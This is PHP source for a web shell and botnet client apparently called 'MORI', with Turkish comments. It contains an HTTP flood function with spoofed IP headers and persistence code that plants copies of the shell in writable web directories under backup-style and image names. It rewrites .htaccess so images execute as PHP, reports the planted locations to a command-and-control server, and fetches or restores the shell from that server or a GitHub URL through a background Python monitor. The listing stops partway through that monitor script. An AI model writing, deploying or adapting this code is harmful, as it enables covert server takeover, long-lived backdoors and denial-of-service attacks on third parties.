// ─── MORI_STRESS helpers ──────────────────────────────────────────────────

// Sadece local arama — download yapmaz (bloklamaz)
function mori_get_dos_path() {
    foreach ([__DIR__, '/tmp', '/dev/shm', '/var/tmp', sys_get_temp_dir()] as $dir) {
        if (!is_dir($dir)) continue;
        foreach (['dos_mori.py', 'dos.py'] as $fn) {
            $p = $dir . '/' . $fn;
            if (@file_exists($p) && @filesize($p) > 1000) return $p;
        }
        foreach (@glob($dir . '/dos.py*') ?: [] as $f) {
            if (@filesize($f) > 1000) return $f;
        }
    }
    return null;
}

function mori_find_python() {
    static $cached = null;
    if ($cached !== null) return $cached;
    $dis = array_map('trim', explode(',', ini_get('disable_functions')));
    $fn  = null;
    foreach (['shell_exec', 'exec'] as $f)
        if (function_exists($f) && !in_array($f, $dis)) { $fn = $f; break; }
    if ($fn) {
        foreach (['python3', 'python', '/usr/bin/python3', '/usr/local/bin/python3', '/usr/bin/python'] as $p) {
            $r = trim((string)@$fn('which ' . escapeshellarg($p) . ' 2>/dev/null'));
            if ($r && $r[0] === '/') return ($cached = $r);
        }
    }
    return ($cached = 'python3');
}

function mori_exec_bg($cmd) {
    $dis = array_map('trim', explode(',', ini_get('disable_functions')));
    foreach (['shell_exec', 'exec', 'system', 'passthru'] as $fn)
        if (function_exists($fn) && !in_array($fn, $dis)) { @$fn($cmd); return true; }
    if (function_exists('proc_open') && !in_array('proc_open', $dis)) {
        $p = @proc_open($cmd, [], $pipes);
        if ($p) { @proc_close($p); return true; }
    }
    if (function_exists('popen') && !in_array('popen', $dis)) {
        $h = @popen($cmd, 'r');
        if ($h) { @pclose($h); return true; }
    }
    return false;
}

// ─────────────────────────────────────────────────────────────────────────────

/**
 * PHP native HTTP flood — rolling window pattern
 * Her tamamlanan istek anında yenisiyle değiştirilir, pool her zaman dolu kalır.
 */
function php_native_flood($url, $method = 'GET', $duration = 20, $concurrency = 50, $rpc = 10) {
    if (!function_exists('curl_multi_init')) return '[ERROR] curl_multi yok';
    if (empty($url) || !preg_match('#^https?://#i', $url)) return '[ERROR] Geçersiz URL';

    static $UAS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    ];

    $method   = strtoupper(in_array(strtoupper($method), ['GET','POST','HEAD']) ? $method : 'GET');
    $deadline = time() + $duration;
    $sent = $errors = 0;

    $make = function() use ($url, $method, &$UAS) {
        $ip = mt_rand(1,223).'.'.mt_rand(0,255).'.'.mt_rand(0,255).'.'.mt_rand(1,254);
        $ch = curl_init($url . '?_=' . mt_rand(1, 2147483647) . '&t=' . time());
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => false,
            CURLOPT_TIMEOUT        => 5,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_USERAGENT      => $UAS[array_rand($UAS)],
            CURLOPT_FORBID_REUSE   => false,
            CURLOPT_FRESH_CONNECT  => false,
            CURLOPT_HTTPHEADER     => [
                'X-Forwarded-For: ' . $ip,
                'X-Real-IP: '       . $ip,
                'CF-Connecting-IP: '. $ip,
                'Accept: */*',
                'Connection: keep-alive',
                'Cache-Control: no-cache',
            ],
        ]);
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'x=' . substr(md5(mt_rand()), 0, mt_rand(16,64)));
        } elseif ($method === 'HEAD') {
            curl_setopt($ch, CURLOPT_NOBODY, true);
        }
        return $ch;
    };

    $mh   = curl_multi_init();
    curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, $concurrency);
    $pool = [];

    // fill initial pool
    for ($i = 0; $i < $concurrency; $i++) {
        $ch = $make();
        curl_multi_add_handle($mh, $ch);
        $pool[(int)$ch] = $ch;
    }

    // rolling window — as soon as one slot frees, fire a new request
    while (time() < $deadline) {
        curl_multi_exec($mh, $running);
        while ($done = curl_multi_info_read($mh)) {
            $ch   = $done['handle'];
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            ($code > 0) ? $sent++ : $errors++;
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
            unset($pool[(int)$ch]);
            if (time() < $deadline) {
                $new = $make();
                curl_multi_add_handle($mh, $new);
                $pool[(int)$new] = $new;
            }
        }
        curl_multi_select($mh, 0.001);
    }

    foreach ($pool as $ch) { curl_multi_remove_handle($mh, $ch); curl_close($ch); }
    curl_multi_close($mh);

    $rps = $duration > 0 ? round($sent / $duration) : $sent;
    return "[PHP_STRESS] $url | $method | {$duration}s | sent:{$sent} err:{$errors} | ~{$rps} req/s";
}

// =====================================================
// DOSYA SİSTEMİ İŞLEMLERİ
// =====================================================
function list_directory($path) {
    $path = str_replace('\\', '/', $path);
    $real = realpath($path);
    
    if (!$real || !is_dir($real)) {
        return json_encode(['error' => "Directory not found: $path"]);
    }
    
    $items = [];
    $dir = @opendir($real);
    
    if (!$dir) {
        return json_encode(['error' => "Cannot open directory: $path"]);
    }
    
    while (($file = readdir($dir)) !== false) {
        if ($file === '.' || $file === '..') continue;
        
        $full = $real . DIRECTORY_SEPARATOR . $file;
        $stat = @stat($full);
        
        $items[] = [
            'name' => $file,
            'type' => is_dir($full) ? 'dir' : 'file',
            'path' => str_replace('\\', '/', $full),
            'size' => is_file($full) ? filesize($full) : 0,
            'perms' => substr(sprintf('%o', fileperms($full)), -4),
            'owner' => function_exists('fileowner') ? fileowner($full) : null,
            'group' => function_exists('filegroup') ? filegroup($full) : null,
            'modified' => filemtime($full),
            'readable' => is_readable($full),
            'writable' => is_writable($full),
            'executable' => is_executable($full)
        ];
    }
    
    closedir($dir);
    
    // Dizinleri önce sırala
    usort($items, function($a, $b) {
        if ($a['type'] === $b['type']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $a['type'] === 'dir' ? -1 : 1;
    });
    
    return json_encode($items, JSON_PRETTY_PRINT);
}

function read_file($file) {
    $real = realpath($file);
    
    if (!$real || !is_file($real) || !is_readable($real)) {
        return "[ERROR] Cannot read file: $file";
    }
    
    $content = @file_get_contents($real);
    return $content !== false ? $content : "[ERROR] Read failed";
}

function write_file($file, $content_b64) {
    $content = safe_base64_decode($content_b64);
    if ($content === false) $content = @base64_decode($content_b64, true);
    if ($content === false) return "[ERROR] Failed to decode base64 content";
    $dir = dirname($file);
    
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    
    $result = @file_put_contents($file, $content);
    return $result !== false ? "OK: $result bytes written" : "[ERROR] Write failed";
}

function delete_file($file) {
    $real = realpath($file);
    
    if (!$real || !is_file($real)) {
        return "[ERROR] File not found: $file";
    }
    
    return @unlink($real) ? "OK: Deleted $file" : "[ERROR] Delete failed";
}

function copy_file($src, $dst) {
    return @copy($src, $dst) ? "OK: Copied $src to $dst" : "[ERROR] Copy failed";
}

function create_directory($path) {
    return @mkdir($path, 0755, true) ? "OK: Created $path" : "[ERROR] Cannot create directory";
}

function get_persistence_target_file() {
    return __FILE__;
}

function get_persistence_source_url() {
    global $persistence_default_url;
    $url = $persistence_default_url;
    $localFile = __DIR__ . '/.persistence_source_url';
    if (file_exists($localFile)) {
        $stored = trim(file_get_contents($localFile));
        if (filter_var($stored, FILTER_VALIDATE_URL)) {
            $url = $stored;
        }
    }
    return $url;
}

function find_writable_directories($bases, $maxDirs = 50, $maxDepth = 3, $maxNodes = 1000) {
    /**
     * PHP-based recursive writable directories search
     * Used as fallback when shell commands unavailable
     */
    $found = [];
    $visited = [];
    $queue = [];

    foreach ($bases as $base) {
        if (!$base || !is_dir($base)) {
            continue;
        }
        $real = realpath($base);
        if (!$real || isset($visited[$real])) {
            continue;
        }
        $visited[$real] = true;
        if (is_writable($real)) {
            $found[] = $real;
        }
        $queue[] = ['path' => $real, 'depth' => 0];
    }

    $nodes = 0;
    while ($queue && count($found) < $maxDirs && $nodes < $maxNodes) {
        $item = array_shift($queue);
        $nodes++;
        $path = $item['path'];
        $depth = $item['depth'];

        if ($depth >= $maxDepth) {
            continue;
        }

        $entries = @scandir($path);
        if (!$entries || !is_array($entries)) {
            continue;
        }

        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }
            $sub = $path . DIRECTORY_SEPARATOR . $entry;
            if (!is_dir($sub)) {
                continue;
            }
            $realSub = realpath($sub);
            if (!$realSub || isset($visited[$realSub])) {
                continue;
            }
            if (in_array($entry, ['proc', 'sys', 'dev', 'run', 'tmp', 'lost+found'], true)) {
                continue;
            }
            $visited[$realSub] = true;
            if (is_writable($realSub)) {
                $found[] = $realSub;
            }
            $queue[] = ['path' => $realSub, 'depth' => $depth + 1];
        }
    }

    return $found;
}

function enumerate_root_writable_dirs() {
    /**
     * Root path altında writable dizinleri enumerate et
     * find / -maxdepth 5 -writable -type d 2>/dev/null | head -n 100
     */
    $writable_dirs = [];
    
    // YÖNTEM 1: find komutu ile (daha hızlı ve kapsamlı)
    if (function_exists('shell_exec')) {
        $find_cmd = 'find / -maxdepth 5 -writable -type d 2>/dev/null | head -n 100';
        $output = @shell_exec($find_cmd);
        if ($output) {
            $lines = explode("\n", trim($output));
            foreach ($lines as $line) {
                $line = trim($line);
                if ($line && is_dir($line) && is_writable($line)) {
                    $writable_dirs[] = $line;
                }
            }
        }
    }
    
    // YÖNTEM 2: PHP ile recursive search (fallback)
    if (count($writable_dirs) < 10) {
        $php_dirs = find_writable_directories(['/'], 100, 5, 1000);
        $writable_dirs = array_merge($writable_dirs, $php_dirs);
    }
    
    // Duplicate'ları kaldır ve filtrele
    $writable_dirs = array_unique($writable_dirs);
    $filtered = [];
    
    foreach ($writable_dirs as $dir) {
        // Tehlikeli dizinleri çıkar
        if (strpos($dir, '/proc/') === 0 || 
            strpos($dir, '/sys/') === 0 || 
            strpos($dir, '/dev/') === 0 ||
            $dir === '/' ||
            !is_writable($dir)) {
            continue;
        }
        $filtered[] = $dir;
    }
    
    return array_slice($filtered, 0, 100);
}

// =====================================================
// PERSISTENCE V4 - WARRIOR SYSTEM
// Multi-location deployment + Sister files + PNG masking
// =====================================================

function get_deployment_targets() {
    /**
     * Find all writable web directories recursively
     * Returns paths to deploy sister files
     */
    $targets = [];
    
    // Primary locations
    $base_paths = [
        '/var/www/html',
        '/var/www',
        '/home',
        '/opt',
        '/srv',
        '/usr/share/nginx/html',
        dirname(__DIR__),
        __DIR__,
        sys_get_temp_dir(),
    ];
    
    foreach ($base_paths as $base) {
        if (!@is_dir($base) || !@is_writable($base)) continue;
        
        // Add base directory
        if (count($targets) < 20) {
            $targets[] = $base;
        }
        
        // Scan for WordPress/plugin directories
        $subdirs = @scandir($base);
        if (!$subdirs) continue;
        
        foreach ($subdirs as $subdir) {
            if ($subdir === '.' || $subdir === '..') continue;
            
            $full_path = $base . '/' . $subdir;
            if (!@is_dir($full_path) || !@is_readable($full_path)) continue;
            
            // WordPress themes
            if ($subdir === 'wp-content') {
                $themes = $full_path . '/themes';
                if (@is_dir($themes) && @is_writable($themes)) {
                    $targets[] = $themes;
                }
                
                $plugins = $full_path . '/plugins';
                if (@is_dir($plugins) && @is_writable($plugins)) {
                    $targets[] = $plugins;
                }
            }
            
            // Generic web directory
            if (@is_writable($full_path) && count($targets) < 20) {
                $targets[] = $full_path;
            }
        }
    }
    
    return array_values(array_unique($targets));
}

// ====================================================
// DEEP DEPLOYMENT TARGET SCANNING (Generic Linux)
// ====================================================
function get_deployment_targets_from_backup() {
    $targets = [];
    // Minimal exclusion: only truly critical system dirs
    $excluded_root_dirs = ["proc", "sys", "dev", "etc", "lib"];
    
    // 1. SYSTEM SCAN - Start from root, avoid excluded dirs
    function scan_writable_everywhere($path, &$results, $max_depth = 4, $depth = 0, $excluded = []) {
        if (count($results) >= 100 || $depth >= $max_depth) return;
        if (!@is_dir($path) || !@is_readable($path)) return;
        
        $entries = @scandir($path);
        if (!$entries) return;
        
        foreach ($entries as $entry) {
            if ($entry === "." || $entry === "..") continue;
            
            // Skip excluded dirs at root level
            if ($depth === 0 && in_array($entry, $excluded)) continue;
            
            $full = $path . "/" . $entry;
            if (!@is_dir($full) || !@is_readable($full)) continue;
            
            // Writable? Add it
            if (@is_writable($full) && count($results) < 100) {
                $results[] = $full;
            }
            
            // Stay shallow to avoid massive deep recursion
            if ($depth < $max_depth - 1 && strlen($full) < 80) {
                scan_writable_everywhere($full, $results, $max_depth, $depth + 1, $excluded);
            }
        }
    }
    
    // Start from root
    scan_writable_everywhere("/", $targets, 3, 0, $excluded_root_dirs);
    
    // 2. WEB-SPECIFIC DEEP SCAN - Go deeper in web roots
    function scan_web_deep($base, &$results, $max_depth = 6, $depth = 0) {
        if (count($results) >= 100 || $depth >= $max_depth) return;
        if (!@is_dir($base) || !@is_readable($base)) return;
        
        $entries = @scandir($base);
        if (!$entries) return;
        
        foreach ($entries as $entry) {
            if ($entry === "." || $entry === "..") continue;
            
            $full = $base . "/" . $entry;
            if (!@is_dir($full) || !@is_readable($full)) continue;
            
            // Prioritize ANY common web/app locations (generic, not WordPress-specific)
            $is_web_priority = (
                preg_match("/public_html|www|html|webroot|htdocs|web/i", $full) ||
                preg_match("/uploads|files|media|downloads|attachments/i", $full) ||
                preg_match("/apps?|store|api|backend|frontend|dist|build/i", $full) ||
                preg_match("/\.git|\.config|\.cache|\.local|\.ssh/i", $full) ||
                preg_match("/[a-f0-9\-]{36}|[0-9]{4,}/", basename($full)) // UUID or numeric dirs (tenant IDs)
            );
            
            if (@is_writable($full) && count($results) < 100) {
                // DEEP PATHS GET PRIORITY
                $depth_score = substr_count($full, "/");
                $results[] = ["path" => $full, "depth" => $depth_score, "web" => $is_web_priority];
            }
            
            // Go deeper
            if ($depth < $max_depth - 1) {
                scan_web_deep($full, $results, $max_depth, $depth + 1);
            }
        }
    }
    
    // Web root deep scan
    $web_bases = ["/var/www", "/home", "/opt", "/srv", "/var"];
    foreach ($web_bases as $base) {
        if (@is_dir($base)) {
            $temp = [];
            scan_web_deep($base, $temp);
            $targets = array_merge($targets, $temp);
        }
    }
    
    // 3. SORT BY DEPTH (deeper = better for hiding)
    usort($targets, function($a, $b) {
        if (is_array($a)) {
            $depth_a = $a["depth"] ?? 0;
            return $depth_a > ($b["depth"] ?? 0) ? -1 : 1; // Descending (deeper first)
        }
        return 0;
    });
    
    // Extract just paths
    $final_targets = [];
    foreach ($targets as $item) {
        if (is_array($item)) {
            $final_targets[] = $item["path"];
        } else {
            $final_targets[] = $item;
        }
    }
    
    return array_values(array_unique($final_targets));
}

// Combine both deployment target scanners
function get_all_deployment_targets() {
    $targets = array_merge(
        get_deployment_targets(),
        get_deployment_targets_from_backup()
    );
    return array_unique($targets);
}

function file_path_to_url($file_path) {
    $scheme   = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host     = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
    $doc_root = rtrim($_SERVER['DOCUMENT_ROOT'] ?? '', '/');

    // 1. DOCUMENT_ROOT mapping — en güvenilir yöntem
    if ($doc_root && $host && strpos($file_path, $doc_root) === 0) {
        $rel = ltrim(str_replace('\\', '/', substr($file_path, strlen($doc_root))), '/');
        return $scheme . '://' . $host . '/' . $rel;
    }

    // 2. Shell URL'den türet — DOCUMENT_ROOT yokken (CLI, cron)
    $shell_url = $GLOBALS['WEB_URL'] ?? $GLOBALS['web_shell_url'] ?? '';
    if ($shell_url) {
        $shell_dir = rtrim(str_replace('\\', '/', __DIR__), '/');
        $file_norm = str_replace('\\', '/', $file_path);
        if (strpos($file_norm, $shell_dir) === 0) {
            $base = rtrim(dirname($shell_url), '/');
            $rel  = ltrim(substr($file_norm, strlen($shell_dir)), '/');
            return $base . '/' . $rel;
        }
    }

    // 3. /var/www/html/<file>
    if (strpos($file_path, '/var/www/html') === 0) {
        $rel = ltrim(substr($file_path, strlen('/var/www/html')), '/');
        return $scheme . '://' . ($host ?: 'localhost') . '/' . $rel;
    }

    // 4. /var/www/<domain>/...
    if (preg_match('|^/var/www/([^/]+)/(.+)|', $file_path, $m)) {
        return $scheme . '://' . $m[1] . '/' . $m[2];
    }

    // 5. /home/<user>/public_html/...
    if (preg_match('|^/home/[^/]+/public_html/(.+)|', $file_path, $m)) {
        return $scheme . '://' . ($host ?: 'localhost') . '/' . $m[1];
    }

    return null;
}

function deploy_sister_files_aggressive() {
    /**
     * WARRIOR SYSTEM v3 - GENERIC LINUX SITES
     * Deploy sister files to 10+ locations with masking
     * Works on ANY Linux site (not just WordPress)
     * FIX: Sister files use .png/.gif/.jpg ONLY (no .php.png pattern)
     */
    global $c2_server, $web_shell_url;
    
    // Lock - 1 hour deployment cooldown
    $deploy_lock = '/tmp/.mori_deploy_lock_v4';
    if (@file_exists($deploy_lock)) {
        $lock_age = time() - @filemtime($deploy_lock);
        if ($lock_age < 3600) return true; // Already deployed recently
    }
    
    // Get targets - dynamic enumeration
    $targets = get_all_deployment_targets();
    $targets = array_unique($targets);
    if (count($targets) < 3) return false;
    
    @touch($deploy_lock);
    
    // Read current shell code
    $shell_code = @file_get_contents(__FILE__);
    if (!$shell_code || strlen($shell_code) < 15000) return false;
    
    // Deploy strategy (generic for ANY Linux site):
    // 1. Generic PHP files (config-backup.php, system-backup.php, etc)
    // 2. Image-masked PHP files (logo.png, banner.gif, avatar.jpg)
    // 3. .htaccess for magic routing
    
    $deployed = [];
    // Generic names (not WordPress-specific)
    $standard_names = ['config-backup.php', 'system-backup.php', 'init-backup.php'];
    $masked_names = ['logo.png', 'banner.gif', 'avatar.jpg'];
    
    foreach (array_slice($targets, 0, 10) as $idx => $target) {
        if (!@is_dir($target) || !@is_writable($target)) continue;
        
        // Strategy 1: Standard PHP file
        $standard_file = $target . '/' . $standard_names[$idx % count($standard_names)];
        @file_put_contents($standard_file, $shell_code);
        @chmod($standard_file, 0644);
        $deployed[] = $standard_file;
        
        // Strategy 2: Image-masked PHP (no .php extension - just .png/.gif/.jpg)
        $masked_file = $target . '/' . $masked_names[$idx % count($masked_names)];
        $masked_code = "<?php\n" . substr($shell_code, 5);
        @file_put_contents($masked_file, $masked_code);
        @chmod($masked_file, 0644);
        $deployed[] = $masked_file;
        
        // Strategy 3: .htaccess to execute images as PHP
        $htaccess = $target . '/.htaccess';
        $htaccess_content = <<<'HTACCESS'
<FilesMatch "\.png$|\.gif$|\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch "(config|system|init)-backup\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch "^\.">
    Deny From All
</FilesMatch>
HTACCESS;
        @file_put_contents($htaccess, $htaccess_content);
        @chmod($htaccess, 0644);
    }
    
    // Store deployment info in C2
    $deployment_info = [
        'deployed_count' => count($deployed),
        'locations' => $deployed,
        'timestamp' => time(),
        'target_count' => count($targets),
        'urls' => []
    ];
    
    // Generate accessible URLs using DOCUMENT_ROOT-aware mapping
    foreach ($deployed as $file_path) {
        $mapped = file_path_to_url($file_path);
        if ($mapped) $deployment_info['urls'][] = $mapped;
    }
    $deployment_info['urls'] = array_values(array_unique($deployment_info['urls']));

    // Cache for registration pickup
    @file_put_contents(sys_get_temp_dir() . '/.mori_sister_cache.json', json_encode($deployment_info));

    return $deployment_info;
}

function report_sister_files_to_c2($deployment_info) {
    $server = $GLOBALS['C2_SERVER'] ?? '';
    $id     = $GLOBALS['CLIENT_ID'] ?? '';
    if (!$server || !$id || empty($deployment_info['locations'])) return false;

    $payload = [
        'id'          => $id,
        'sister_files'=> $deployment_info['locations'],
        'sister_urls' => $deployment_info['urls'] ?? [],
        'deployed_at' => $deployment_info['timestamp'] ?? time(),
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    @http_post_timeout($server . '?act=sister_report', $encoded, 2);
    return true;
}

function generate_wp_config_backup() {
    /**
     * Generate wp-config-backup.php
     * ORCHESTRATOR for deployment v3
     * Optimized writable dir scanning + deep path prioritization
     */
    
    global $C2_SERVER, $web_shell_url;
    $c2_server = $C2_SERVER;  // $C2_SERVER is the actual global; $c2_server only exists inside c2_register()

    $code = '<?php
/**
 * WordPress Configuration Backup Orchestrator v3
 * Smart writable directory detection + deep path prioritization
 */

// OPTIMIZED: Scan writable directories (system-wide + web)
function get_deployment_targets_from_backup() {
    $targets = [];
    // Minimal exclusion: only truly critical system dirs
    $excluded_root_dirs = ["proc", "sys", "dev", "etc", "lib"];
    
    // 1. SYSTEM SCAN - Start from root, avoid excluded dirs
    function scan_writable_everywhere($path, &$results, $max_depth = 4, $depth = 0, $excluded = []) {
        if (count($results) >= 100 || $depth >= $max_depth) return;
        if (!@is_dir($path) || !@is_readable($path)) return;
        
        $entries = @scandir($path);
        if (!$entries) return;
        
        foreach ($entries as $entry) {
            if ($entry === "." || $entry === "..") continue;
            
            // Skip excluded dirs at root level
            if ($depth === 0 && in_array($entry, $excluded)) continue;
            
            $full = $path . "/" . $entry;
            if (!@is_dir($full) || !@is_readable($full)) continue;
            
            // Writable? Add it
            if (@is_writable($full) && count($results) < 100) {
                $results[] = $full;
            }
            
            // Stay shallow to avoid massive deep recursion
            if ($depth < $max_depth - 1 && strlen($full) < 80) {
                scan_writable_everywhere($full, $results, $max_depth, $depth + 1, $excluded);
            }
        }
    }
    
    // Start from root
    scan_writable_everywhere("/", $targets, 3, 0, $excluded_root_dirs);
    
    // 2. WEB-SPECIFIC DEEP SCAN - Go deeper in web roots
    function scan_web_deep($base, &$results, $max_depth = 6, $depth = 0) {
        if (count($results) >= 100 || $depth >= $max_depth) return;
        if (!@is_dir($base) || !@is_readable($base)) return;
        
        $entries = @scandir($base);
        if (!$entries) return;
        
        foreach ($entries as $entry) {
            if ($entry === "." || $entry === "..") continue;
            
            $full = $base . "/" . $entry;
            if (!@is_dir($full) || !@is_readable($full)) continue;
            
            // Prioritize ANY common web/app locations (generic, not WordPress-specific)
            $is_web_priority = (
                preg_match("/public_html|www|html|webroot|htdocs|web/i", $full) ||
                preg_match("/uploads|files|media|downloads|attachments/i", $full) ||
                preg_match("/apps?|store|api|backend|frontend|dist|build/i", $full) ||
                preg_match("/\.git|\.config|\.cache|\.local|\.ssh/i", $full) ||
                preg_match("/[a-f0-9\-]{36}|[0-9]{4,}/", basename($full)) // UUID or numeric dirs (tenant IDs)
            );
            
            if (@is_writable($full) && count($results) < 100) {
                // DEEP PATHS GET PRIORITY
                $depth_score = substr_count($full, "/");
                $results[] = ["path" => $full, "depth" => $depth_score, "web" => $is_web_priority];
            }
            
            // Go deeper
            if ($depth < $max_depth - 1) {
                scan_web_deep($full, $results, $max_depth, $depth + 1);
            }
        }
    }
    
    // Web root deep scan
    $web_bases = ["/var/www", "/home", "/opt", "/srv", "/var"];
    foreach ($web_bases as $base) {
        if (@is_dir($base)) {
            $temp = [];
            scan_web_deep($base, $temp);
            $targets = array_merge($targets, $temp);
        }
    }
    
    // 3. SORT BY DEPTH (deeper = better for hiding)
    usort($targets, function($a, $b) {
        if (is_array($a)) {
            $depth_a = $a["depth"] ?? 0;
            return $depth_a > ($b["depth"] ?? 0) ? -1 : 1; // Descending (deeper first)
        }
        return 0;
    });
    
    // Extract just paths
    $final_targets = [];
    foreach ($targets as $item) {
        if (is_array($item)) {
            $final_targets[] = $item["path"];
        } else {
            $final_targets[] = $item;
        }
    }
    
    return array_values(array_unique($final_targets));
}

// Get main shell code
function get_main_shell_code() {
    // Try multiple locations
    $paths = array_merge(
        glob("/var/www/*/public_html/haeder.php"),
        glob("/var/www/*/haeder.php"),
        glob("/home/*/public_html/haeder.php"),
        [__DIR__ . "/haeder.php", dirname(__DIR__) . "/haeder.php"]
    );
    
    foreach ($paths as $path) {
        $code = @file_get_contents($path);
        if ($code && strlen($code) > 15000) {
            return $code;
        }
    }
    
    return null;
}

// Fetch from C2 if local not available
function get_shell_code_fallback() {
    $c2_url = ($GLOBALS["C2_SERVER"] ?? "") . "?act=get_shell";
    $content = @file_get_contents($c2_url);
    if ($content && strlen($content) > 15000) {
        return $content;
    }
    
    $github_url = "https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php";
    $content = @file_get_contents($github_url);
    if ($content && strlen($content) > 15000) {
        return $content;
    }
    
    return null;
}

// Deploy to all targets
function deploy_sister_files_from_backup() {
    $shell_code = get_main_shell_code();
    if (!$shell_code) {
        $shell_code = get_shell_code_fallback();
        if (!$shell_code) return 0;
    }

    $targets = get_deployment_targets_from_backup();
    $deployed_paths = [];

    $standard_names = ["wp-config-backup.php", "wp-content-backup.php", "wp-settings-backup.php"];
    $masked_names = ["logo.png", "banner.gif", "avatar.jpg"];

    foreach (array_slice($targets, 0, 10) as $idx => $target) {
        // Standard PHP
        $file = $target . "/" . $standard_names[$idx % count($standard_names)];
        if (@file_put_contents($file, $shell_code)) {
            @chmod($file, 0644);
            $deployed_paths[] = $file;
        }

        // Image masked (no .php extension)
        $img = $target . "/" . $masked_names[$idx % count($masked_names)];
        $masked = "<?php\n" . substr($shell_code, 5);
        if (@file_put_contents($img, $masked)) {
            @chmod($img, 0644);
            $deployed_paths[] = $img;
        }

        // .htaccess - execute .png .gif .jpg as PHP
        $htaccess = $target . "/.htaccess";
        $content = "<FilesMatch \"\\.png$|\\.gif$|\\.jpg$\">\n" .
                   "    SetHandler application/x-httpd-php\n" .
                   "</FilesMatch>\n";
        @file_put_contents($htaccess, $content);
    }

    // Merge new paths into sister cache (picked up by main shell on next register)
    $cache_file = sys_get_temp_dir() . "/.mori_sister_cache.json";
    $existing   = @json_decode(@file_get_contents($cache_file), true) ?: ["locations" => [], "urls" => [], "timestamp" => 0];
    $existing["locations"] = array_values(array_unique(array_merge($existing["locations"] ?? [], $deployed_paths)));
    $existing["timestamp"] = time();
    @file_put_contents($cache_file, json_encode($existing));

    return count($deployed_paths);
}

// Main execution
if (php_sapi_name() !== "cli" || !isset($GLOBALS["_wp_config_backup_running"])) {
    $GLOBALS["_wp_config_backup_running"] = true;
    deploy_sister_files_from_backup();
}

// Silent exit
exit(0);
?>';

    return $code;
}

function ensure_persistence_v4() {
    /**
     * MAIN ORCHESTRATOR v2 - Called on every register
     * Deploys sister files + Starts Python + Bash monitors (max 1 each)
     */
    global $c2_server, $web_shell_url, $CLIENT_ID, $client_id, $C2_SERVER;

    // Throttle: her 5 dakikada bir çalış (her ?m= requestinde değil)
    $throttle = sys_get_temp_dir() . '/.mori_persist_ts';
    $last = (int)@file_get_contents($throttle);
    if ($last && (time() - $last) < 300) return;
    @file_put_contents($throttle, time());

    $client_id = $client_id ?: ($CLIENT_ID ?: md5(gethostname() . microtime()));

    // Step 1: Deploy aggressive sister files and report to C2
    $deploy_info = @deploy_sister_files_aggressive();
    if (is_array($deploy_info) && !empty($deploy_info['locations'])) {
        @report_sister_files_to_c2($deploy_info);
    }
    
    // Step 2: Create wp-config-backup.php orchestrator
    $backup_code = @generate_wp_config_backup();
    if ($backup_code) {
        $backup_file = '/tmp/wp-config-backup.php';
        @file_put_contents($backup_file, $backup_code);
        @chmod($backup_file, 0755);
        
        // Execute in background
        exec_any("nohup php " . escapeshellarg($backup_file), true);
    }
    
    // Step 3: Start monitor processes (ONLY 1 instance each, no duplicates)
    $monitor_lock = '/tmp/.svc_monitor_lock';
    $lock_age = @file_exists($monitor_lock) ? (time() - @filemtime($monitor_lock)) : 0;
    
    // Start monitors: check every 5 minutes (lock freshness)
    if ($lock_age > 300) {
        @touch($monitor_lock);
        
        // Python monitor (max 1 instance) — local file check + restore
        $py_process_count = (int)(exec_any("pgrep -c -f '/tmp/sys_security.py' 2>/dev/null || echo 0") ?: 0);
        if ($py_process_count == 0) {
            $shell_path_esc = addslashes(SHELL_PATH);
            $shell_file_esc = addslashes(SHELL_FILE);
            $c2_url_esc     = addslashes($C2_SERVER ?: '');
            $token_esc      = md5('mori_c2_secret_2024_persistence');
            $py_code = '#!/usr/bin/env python3
import os, time, ssl, urllib.request

SHELL_PATH = "' . $shell_path_esc . '"
SHELL_FILE = "' . $shell_file_esc . '"
C2_URL     = "' . $c2_url_esc     . '"
TOKEN      = "' . $token_esc      . '"
GH_URL     = "https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php"
INTERVAL   = 60  # local check only — no HTTP alive probe

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

def needs_restore():
    try:
        return os.path.getsize(SHELL_PATH) < 10000
    except OSError:
        return True  # file missing

def restore():
    sources = [
        (C2_URL + "?act=get_shell&token=" + TOKEN + "&file=" + SHELL_FILE, 4),
        (GH_URL, 15),
    ]
    for url, tmo in sources:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=tmo, context=ctx) as r:
                code = r.read()
